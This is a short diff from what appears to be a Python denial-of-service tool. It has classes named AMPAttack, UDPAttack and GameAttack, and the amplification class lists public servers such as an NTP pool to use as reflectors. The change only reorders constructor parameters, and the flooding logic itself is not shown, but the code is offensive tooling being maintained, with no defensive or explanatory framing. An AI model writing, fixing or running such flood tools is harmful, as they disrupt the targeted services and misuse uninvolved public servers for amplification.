@@ -17,7 +17,7 @@ class Layer4Attack:
         self.stop_event.set()
 
 class AMPAttack(Layer4Attack):
-    def __init__(self, target_ip, port, amp_type, duration):
+    def __init__(self, target_ip, port, duration, amp_type):
         super().__init__(target_ip, port, duration, amp_type)
         self.amp_servers = {
             'NTP': 'pool.ntp.org:123',
@@ -96,7 +96,7 @@ class UDPAttack(Layer4Attack):
             t.join()
 
 class GameAttack(Layer4Attack):
-    def __init__(self, target_ip, port, game_type, duration):
+    def __init__(self, target_ip, port, duration, game_type):
         super().__init__(target_ip, port, duration, game_type)
         self.game_ports = {
             'GAME': 27015,
